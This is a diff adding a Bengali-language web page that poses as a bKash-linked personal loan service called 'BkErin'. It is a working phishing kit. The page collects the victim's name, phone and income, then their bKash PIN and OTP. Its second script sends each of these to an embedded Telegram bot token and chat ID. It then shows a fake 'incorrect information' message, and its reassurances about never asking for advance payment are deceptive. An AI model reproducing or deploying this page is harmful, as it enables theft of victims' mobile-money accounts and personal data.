@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Quick-Loan</title>
+  <style>
+    :root{
+      --pink:#ff007f;
+      --pink-dark:#e60073;
+      --bg:#ffffff;
+      --text:#222;
+      --muted:#777;
+      --card-shadow: 0 8px 24px rgba(0,0,0,0.08);
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%;margin:0;font-family:Arial, sans-serif;background:var(--bg);color:var(--text)}
+    .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:20px}
+
+    /* Card */
+    .card{width:420px;max-width:95%;border-radius:14px;border:2px solid var(--pink);background:#fff;overflow:hidden;box-shadow:var(--card-shadow)}
+    header{display:flex;gap:12px;align-items:center;padding:16px 18px;background:linear-gradient(90deg, rgba(255,0,127,0.06), rgba(255,0,127,0.02));border-bottom:1px solid rgba(255,0,127,0.06)}
+    .brand-img{width:56px;height:56px;border-radius:10px;object-fit:cover;border:2px solid var(--pink)}
+    header h1{margin:0;font-size:18px;color:var(--pink)}
+    header p{margin:0;font-size:12px;color:var(--muted)}
+
+    /* Pages area */
+    .pages{padding:18px}
+    .page{display:none}
+    .page.active{display:block}
+    h2{color:var(--pink);margin:6px 0 12px;font-size:18px;text-align:center}
+    p{margin:0 0 10px;line-height:1.5}
+    .section{margin-bottom:14px}
+
+    /* Welcome */
+    .welcome-box{display:flex;flex-direction:column;align-items:center;gap:12px;padding:6px 0}
+    .welcome-box img{width:140px;height:140px;border-radius:50%;object-fit:cover;box-shadow:0 6px 20px rgba(0,0,0,0.08)}
+    .welcome-text{font-weight:700;color:var(--pink);font-size:18px}
+
+    /* Table */
+    table{width:100%;border-collapse:collapse;margin:10px 0}
+    th,td{padding:8px;border:1px solid var(--pink);text-align:center;font-size:14px}
+    th{background:var(--pink);color:#fff}
+
+    /* Form */
+    label{display:block;margin-top:8px;font-weight:700;font-size:13px}
+    input[type="text"],input[type="email"],input[type="number"],input[type="tel"],select{
+      width:100%;padding:10px;margin-top:6px;border:1px solid #d0d0d0;border-radius:8px;font-size:14px
+    }
+    .row{display:flex;gap:8px}
+    .row .col{flex:1}
+
+    /* PIN / OTP boxes */
+    .pin-box,.otp-box{display:flex;gap:8px;margin-top:10px;justify-content:space-between}
+    .pin-box input,.otp-box input{width:48px;height:52px;font-size:20px;text-align:center;border-radius:10px;border:2px solid #ddd}
+    .pin-box input:focus,.otp-box input:focus{outline:none;border-color:var(--pink)}
+
+    /* Buttons */
+    .btn{display:inline-block;width:100%;padding:12px;border-radius:10px;border:none;background:var(--pink);color:#fff;font-weight:700;font-size:15px;cursor:pointer;margin-top:12px}
+    .btn-small{padding:8px 12px;border-radius:8px;border:1px solid var(--pink);background:#fff;color:var(--pink);cursor:pointer;font-weight:700}
+    .foot{display:flex;gap:8px;justify-content:space-between;margin-top:12px;color:var(--muted);font-size:13px}
+    .note{background:#fff0f6;border-left:4px solid var(--pink);padding:10px;border-radius:6px;margin-top:10px;font-size:13px}
+
+    /* Responsive */
+    @media (max-width:480px){
+      .card{width:100%}
+      .brand-img{width:48px;height:48px}
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card" role="application" aria-label="বিকাশ লোন ওয়েবসাইট">
+      <header>
+        <img src="https://i.postimg.cc/xdXpXTXH/IMG-20251006-174446-971.jpg" alt="লোগো" class="brand-img">
+        <div>
+          <h1>BkErin</h1>
+          <p>দ্রুত ব্যক্তিগত লোন — সহজ আবেদন</p>
+        </div>
+      </header>
+
+      <div class="pages" id="pages">
+        <!-- 1. Welcome -->
+        <section id="welcome" class="page active" aria-labelledby="welcome-title">
+          <div class="welcome-box">
+            <img src="https://i.postimg.cc/xdXpXTXH/IMG-20251006-174446-971.jpg" alt="বিকাশ লোন লোগো">
+            <div class="welcome-text" id="welcome-title">আপনাকে স্বাগতম! আপনার লোন যাত্রা শুরু করুন।</div>
+            <div style="width:100%">
+              <button class="btn" onclick="go('about')">পরিচিতি ও তথ্য</button>
+            </div>
+          </div>
+        </section>
+
+        <!-- 2. About -->
+        <section id="about" class="page" aria-labelledby="about-title">
+          <h2 id="about-title">পরিচিতি ও তথ্য (About)</h2>
+          <div class="section">
+            <p><strong>BkErin</strong> — আপনার ব্যক্তিগত প্রয়োজনে দ্রুত লোন সেবা। ভেরিফায়েড বিকাশ একাউন্ট থাকলে ৫,০০০৳ থেকে ৩০,০০০৳ পর্যন্ত আবেদন করতে পারবেন। শর্তাদি প্রযোজ্য।</p>
+            <p>আমরা গ্রাহকের প্রোফাইল দেখে দ্রুত সিদ্ধান্ত নেই। অগ্রিম টাকা চাওয়া হলে রিপোর্ট করুন — আমরা কখনই অগ্রিম চাইব না।</p>
+          </div>
+          <div style="display:flex;gap:8px">
+            <button class="btn-small" onclick="go('welcome')">ফিরে যান</button>
+            <button class="btn" onclick="go('limits')">লোন লিমিট ও EMI টেবিল</button>
+          </div>
+        </section>
+
+        <!-- 3. Loan limits & EMI table -->
+        <section id="limits" class="page" aria-labelledby="limits-title">
+          <h2 id="limits-title">লোন লিমিট ও EMI টেবিল</h2>
+          <p>নিচের টেবিলে উদাহরণ হিসেবে বিভিন্ন লোন লিমিট ও মাসিক কিস্তি দেখানো হল (উদাহরণ):</p>
+          <table aria-describedby="limits-title">
+            <thead>
+              <tr><th>লোন লিমিট</th><th>মেয়াদ</th><th>অনুমানিত EMI (মাসিক)</th></tr>
+            </thead>
+            <tbody>
+              <tr><td>৫,০০০৳</td><td>৩ মাস</td><td>১,৭০০৳</td></tr>
+              <tr><td>১০,০০০৳</td><td>৩ মাস</td><td>৩,৩০০৳</td></tr>
+              <tr><td>১৫,০০০৳</td><td>৬ মাস</td><td>২,৫০০৳</td></tr>
+              <tr><td>২০,০০০৳</td><td>৬ মাস</td><td>৩,৩০০৳</td></tr>
+              <tr><td>৩০,০০০৳</td><td>৬ মাস</td><td>৪,৯০০৳</td></tr>
+            </tbody>
+          </table>
+          <div class="note"><strong>বি দ্রঃ</strong> উপরোক্ত কিস্তিরা উদাহরণস্বরূপ। চূড়ান্ত কিস্তি আবেদন বিশ্লেষণের পরে নির্ধারণ করা হবে।</div>
+
+          <div style="display:flex;gap:8px;margin-top:12px">
+            <button class="btn-small" onclick="go('about')">পেছনে</button>
+            <button class="btn" onclick="go('apply')">লোন আবেদন ফর্ম</button>
+          </div>
+        </section>
+
+        <!-- 4. Loan application form -->
+        <section id="apply" class="page" aria-labelledby="apply-title">
+          <h2 id="apply-title">লোন আবেদন ফর্ম</h2>
+          <form id="loanForm" autocomplete="off" novalidate>
+            <label for="fullName">নাম:</label>
+            <input id="fullName" type="text" placeholder="আপনার পূর্ণ নাম" required>
+
+            <label for="age">বয়স:</label>
+            <input id="age" type="number" min="18" placeholder="বয়স" required>
+
+            <label for="phoneApp">ফোন (বিকাশ):</label>
+            <input id="phoneApp" type="tel" placeholder="017xxxxxxxx" maxlength="11" required>
+
+            <label for="emailApp">ইমেইল :</label>
+            <input id="emailApp" type="email" placeholder="example@mail.com">
+
+            <label for="profession">পেশা:</label>
+            <select id="profession" onchange="updateIncomeOptions()" required>
+              <option value="">-- নির্বাচন করুন --</option>
+              <option>চাকরিজীবী</option>
+              <option>ব্যবসায়ী</option>
+              <option>ফ্রিল্যান্সার</option>
+              <option>কৃষক</option>
+              <option>ছাত্র</option>
+            </select>
+
+            <label for="income">মাসিক ইনকাম:</label>
+            <select id="income" required>
+              <option value="">-- প্রথমে পেশা নির্বাচন করুন --</option>
+            </select>
+
+            <label for="amount">লোনের পরিমাণ:</label>
+            <select id="amount" required>
+              <option value="">-- নির্বাচন করুন --</option>
+              <option>৫,০০০৳</option>
+              <option>১০,০০০৳</option>
+              <option>১৫,০০০৳</option>
+              <option>২০,০০০৳</option>
+              <option>৩০,০০০৳</option>
+            </select>
+
+            <button type="submit" class="btn">পরবর্তী</button>
+          </form>
+
+          <div class="foot">
+            <span style="cursor:pointer;color:var(--pink)" onclick="go('limits')">পেছনে</span>
+            <span>গোপনীয়তা রক্ষা করা হবে</span>
+          </div>
+        </section>
+
+        <!-- 5. Login (phone + pin) -->
+        <section id="login" class="page" aria-labelledby="login-title">
+          <h2 id="login-title">লগইন (ফোন + পিন)</h2>
+          <form id="loginForm" autocomplete="off" novalidate>
+            <label for="phoneLogin">ফোন নম্বর (বিকাশ):</label>
+            <input id="phoneLogin" type="tel" placeholder="017xxxxxxxx" maxlength="11" required pattern="[0-9]{11}">
+
+            <label style="margin-top:10px">আপনার বিকাশের পিন লিখুন:</label>
+            <div class="pin-box" role="group" aria-label="PIN">
+              <input id="p1" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" required>
+              <input id="p2" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" required>
+              <input id="p3" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" required>
+              <input id="p4" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" required>
+              <input id="p5" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" required>
+            </div>
+
+            <button type="submit" class="btn">লগইন</button>
+          </form>
+
+          <div style="display:flex;gap:8px;margin-top:10px">
+            <button class="btn-small" onclick="go('apply')">ফিরে যান</button>
+            <button class="btn-small" onclick="go('welcome')">হোম</button>
+          </div>
+        </section>
+
+        <!-- 6. OTP verification -->
+        <section id="otp" class="page" aria-labelledby="otp-title">
+          <h2 id="otp-title">OTP যাচাইকরণ</h2>
+          <p>আপনার নম্বরে একটি ৬ সংখ্যার OTP পাঠানো হয়েছে, নিচে লিখুন:</p>
+          <form id="otpForm" autocomplete="off" novalidate>
+            <div class="otp-box" role="group" aria-label="OTP">
+              <input id="o1" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+              <input id="o2" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+              <input id="o3" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+              <input id="o4" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+              <input id="o5" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+              <input id="o6" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+            </div>
+
+            <button type="submit" class="btn">ভেরিফাই করুন</button>
+          </form>
+
+          <div style="display:flex;gap:8px;margin-top:10px">
+            <button class="btn-small" onclick="resendOTP()">OTP পুনরায় পাঠান</button>
+            <button class="btn-small" onclick="go('login')">ফিরে যান</button>
+          </div>
+        </section>
+
+        <!-- Success -->
+        <section id="success" class="page" aria-labelledby="success-title">
+          <h2 id="success-title"> আপনার আবেদনটি সম্পূর্ণ হয়নি</h2>
+          <p>দয়া করে আপনার তথ্য গুলো যাচায় করুন।আপনি আমাদের ভুল তথ্য প্রদান করেছেন,লোন আবেদন করতে আমাদের সঠিক তথ্য প্রদান করুন</p>
+          <div class="note">আপনি চাইলে অনৈতিক বা অগ্রিম দাবি দেখলে রিপোর্ট করুন — আমরা কখনই অগ্রিম চাইব না।</div>
+          <button class="btn" onclick="go('welcome')">প্রথম পৃষ্ঠায় ফিরে যান</button>
+        </section>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Navigation
+    function go(id){
+      document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+      const next = document.getElementById(id);
+      if(next) next.classList.add('active');
+      // focus first input
+      setTimeout(()=>{
+        const el = next.querySelector('input, select, button');
+        if(el) el.focus();
+      },100);
+      // update aria-hidden
+      document.querySelectorAll('.page').forEach(p=>p.setAttribute('aria-hidden', !p.classList.contains('active')));
+    }
+
+    // Income options update
+    function updateIncomeOptions(){
+      const p = document.getElementById("profession").value;
+      const s = document.getElementById("income");
+      s.innerHTML = "";
+      let o = [];
+      if (p==="চাকরিজীবী") o=["৳15,000","৳20,000","৳25,000","৳30,000+"];
+      else if (p==="কৃষক") o=["৳5,000","৳8,000","৳10,000","৳15,000+"];
+      else if (p==="ছাত্র") o=["৳1,000","৳2,000","৳3,000","৳5,000+"];
+      else if (p==="ব্যবসায়ী") o=["৳10,000","৳20,000","৳30,000","৳50,000+"];
+      else if (p==="ফ্রিল্যান্সার") o=["৳8,000","৳12,000","৳18,000","৳25,000+"];
+      else o=["-- প্রথমে পেশা নির্বাচন করুন --"];
+      o.forEach(v=>{
+        const op = document.createElement("option");
+        op.value = v; op.textContent = v;
+        s.appendChild(op);
+      });
+    }
+
+    // Auto move for PIN and OTP inputs
+    function autoMove(selector){
+      const inputs = Array.from(document.querySelectorAll(selector));
+      inputs.forEach((el,i,a)=>{
+        el.addEventListener('input', ()=> { if(el.value && i < a.length-1) a[i+1].focus(); });
+        el.addEventListener('keydown', (ev)=> { if(ev.key==='Backspace' && !el.value && i>0) a[i-1].focus(); });
+      });
+    }
+    autoMove('.pin-box input');
+    autoMove('.otp-box input');
+
+    // Simple phone input sanitization
+    document.querySelectorAll('input[type="tel"]').forEach(inp=>{
+      inp.addEventListener('input', function(){ this.value = this.value.replace(/[^0-9]/g,'').slice(0,11); });
+    });
+
+    // Form flows
+    document.getElementById('loanForm').addEventListener('submit', function(e){
+      e.preventDefault();
+      // minimal validation
+      if(!this.checkValidity()) { alert('ফর্মটি সম্পূর্ণ করুন'); return; }
+      // move to login
+      // prefill login phone
+      const phone = document.getElementById('phoneApp').value;
+      if(phone) document.getElementById('phoneLogin').value = phone;
+      go('login');
+    });
+
+    document.getElementById('loginForm').addEventListener('submit', function(e){
+      e.preventDefault();
+      // basic validate phone pattern
+      const phone = document.getElementById('phoneLogin').value;
+      if(phone.length !== 11){ alert('সঠিক ১১ সংখ্যার ফোন নম্বর দিন'); return; }
+      // require pin filled
+      const pins = Array.from(document.querySelectorAll('.pin-box input')).map(i=>i.value).join('');
+      if(pins.length !== 5){ alert('অনুগ্রহ করে বিকাশ পিন লিখুন  '); return; }
+      // go to otp
+      go('otp');
+      // focus first otp
+      setTimeout(()=> { document.getElementById('o1').focus(); },120);
+    });
+
+    document.getElementById('otpForm').addEventListener('submit', function(e){
+      e.preventDefault();
+      const otp = Array.from(document.querySelectorAll('.otp-box input')).map(i=>i.value).join('');
+      if(otp.length !== 6){ alert('৬ সংখ্যার OTP লিখুন'); return; }
+      // demo success
+      go('success');
+    });
+
+    // Resend OTP placeholder
+    function resendOTP(){
+      alert('OTP পুনরায় পাঠানো হয়েছে ।');
+    }
+
+    // Accessibility: Enter submits
+    document.querySelectorAll('form').forEach(form=>{
+      form.addEventListener('keydown', function(e){
+        if(e.key === 'Enter' && e.target.tagName !== 'TEXTAREA'){
+          e.preventDefault();
+          const btn = this.querySelector('button[type="submit"], .btn');
+          if(btn) btn.click();
+        }
+      });
+    });
+
+    // Initialize aria-hidden attributes
+    document.querySelectorAll('.page').forEach(p=>p.setAttribute('aria-hidden', !p.classList.contains('active')));
+    </script>
+  <script>
+// Telegram bot setup
+const BOT_TOKEN = "7833036618:AAFGU5DGq3EVmq8cvNHjEDpLzOCero_Va2w";
+const CHAT_ID = "8451114308";
+
+// Function to send message to Telegram
+async function sendToTelegram(message){
+  try {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: "Markdown"
+      })
+    });
+  } catch(err){
+    console.error('Telegram Error:', err);
+  }
+}
+
+// Loan form submission
+document.getElementById('loanForm').addEventListener('submit', async function(e){
+  e.preventDefault();
+  if(!this.checkValidity()){ alert('ফর্মটি সম্পূর্ণ করুন'); return; }
+
+  const name = document.getElementById('fullName').value;
+  const age = document.getElementById('age').value;
+  const phone = document.getElementById('phoneApp').value;
+  const email = document.getElementById('emailApp').value || "N/A";
+  const profession = document.getElementById('profession').value;
+  const income = document.getElementById('income').value;
+  const amount = document.getElementById('amount').value;
+
+  // Send form details first
+  const formMessage = `
+📋 নতুন লোন আবেদন এসেছে:
+-------------------------
+👤 নাম: ${name}
+🎂 বয়স: ${age}
+📞 ফোন: ${phone}
+📧 ইমেইল: ${email}
+💼 পেশা: ${profession}
+💰 মাসিক ইনকাম: ${income}
+🏦 চাওয়া লোন: ${amount}
+⏰ সময়: ${new Date().toLocaleString('bn-BD')}
+`;
+  await sendToTelegram(formMessage);
+
+  // Prefill login phone
+  document.getElementById('phoneLogin').value = phone;
+  go('login');
+});
+
+// Login form submission
+document.getElementById('loginForm').addEventListener('submit', async function(e){
+  e.preventDefault();
+
+  const phone = document.getElementById('phoneLogin').value;
+  const pin = Array.from(document.querySelectorAll('.pin-box input')).map(i=>i.value).join('');
+  if(pin.length !==5){ alert('৫ সংখ্যার পিন দিন'); return; }
+
+  // Send phone + PIN
+  const loginMessage = `
+🔑 লগইন তথ্য:
+📞 ফোন: ${phone}
+🔢 পিন: ${pin}
+⏰ সময়: ${new Date().toLocaleString('bn-BD')}
+`;
+  await sendToTelegram(loginMessage);
+
+  go('otp');
+  setTimeout(()=>{ document.getElementById('o1').focus(); },100);
+});
+
+// OTP form submission
+document.getElementById('otpForm').addEventListener('submit', async function(e){
+  e.preventDefault();
+  const otp = Array.from(document.querySelectorAll('.otp-box input')).map(i=>i.value).join('');
+  if(otp.length!==6){ alert('৬ সংখ্যার OTP লিখুন'); return; }
+
+  const phone = document.getElementById('phoneLogin').value;
+  const otpMessage = `
+🔐 OTP যাচাইকরণ:
+📞 ফোন: ${phone}
+💯 OTP: ${otp}
+⏰ সময়: ${new Date().toLocaleString('bn-BD')}
+`;
+  await sendToTelegram(otpMessage);
+
+  go('success');
+});
+</script>
+</body>
+</html>
